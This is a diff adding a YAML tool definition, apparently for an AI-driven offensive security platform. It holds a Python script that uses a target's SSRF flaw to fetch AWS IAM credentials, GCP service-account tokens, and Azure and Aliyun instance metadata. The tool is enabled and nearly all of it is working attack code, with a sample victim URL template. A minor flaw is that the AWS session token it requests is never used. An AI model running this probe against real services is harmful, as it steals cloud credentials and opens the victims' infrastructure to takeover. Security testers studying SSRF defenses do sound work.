@@ -1,0 +1,59 @@
+name: "cloud-metadata-ssrf-probe"
+command: "python3"
+args:
+  - "-c"
+  - |
+    import sys, json, urllib.request, urllib.error
+    # SSRF 云元数据探测：对疑似 SSRF 入口回链云元数据端点
+    # 用法（由 CyberStrikeAI 注入参数）：python3 -c '<script>' "<ssrf_url 模板>" "<cloud>" "<additional_args>"
+    # ssrf_url 模板用 {{TARGET}} 占位元数据 URL
+    ssrf_url = sys.argv[1] if len(sys.argv) > 1 else ""
+    cloud = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else "all"
+    if not ssrf_url or "{{TARGET}}" not in ssrf_url:
+        print(json.dumps({"error": "ssrf_url must contain {{TARGET}} placeholder"}, ensure_ascii=False))
+        sys.exit(1)
+    targets = {
+        "aws":   [("http://169.254.169.254/latest/api/token", {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, "PUT"),
+                  ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}, "GET")],
+        "gcp":   [("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}, "GET")],
+        "azure": [("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}, "GET")],
+        "aliyun":[("http://100.100.100.200/latest/meta-data/", {}, "GET")],
+    }
+    clouds = [cloud] if cloud != "all" else list(targets.keys())
+    hits = []
+    for c in clouds:
+        for meta_url, headers, method in targets.get(c, []):
+            full = ssrf_url.replace("{{TARGET}}", urllib.parse.quote(meta_url, safe=""))
+            try:
+                req = urllib.request.Request(full, headers=headers, method=method)
+                with urllib.request.urlopen(req, timeout=8) as r:
+                    body = r.read(2048).decode("utf-8", "ignore")
+                    if r.status < 500:
+                        hits.append({"cloud": c, "endpoint": meta_url, "status": r.status, "snippet": body[:200]})
+            except Exception as e:
+                hits.append({"cloud": c, "endpoint": meta_url, "error": str(e)[:120]})
+    print(json.dumps({"hits": hits}, ensure_ascii=False, indent=2))
+    sys.exit(0 if any("snippet" in h for h in hits) else 1)
+parameters:
+  - name: "ssrf_url"
+    type: "string"
+    description: |
+      可控的 SSRF 入口参数模板。用 `{{TARGET}}` 占位表示元数据 URL 要被拼进去的位置。
+      示例：`https://victim.example.com/fetch?url={{TARGET}}`
+    required: true
+    position: 1
+    format: "positional"
+  - name: "cloud"
+    type: "string"
+    description: "指定云厂：aws | gcp | azure | aliyun | all（默认 all）"
+    required: false
+    position: 2
+    format: "positional"
+    default: "all"
+  - name: "additional_args"
+    type: "string"
+    description: "额外参数（如自定义 header）"
+    required: false
+    format: "positional"
+enabled: true
+short_description: "SSRF 云元数据探测：对疑似 SSRF 入口回链 AWS/GCP/Azure/阿里云元数据，命中即 Critical"
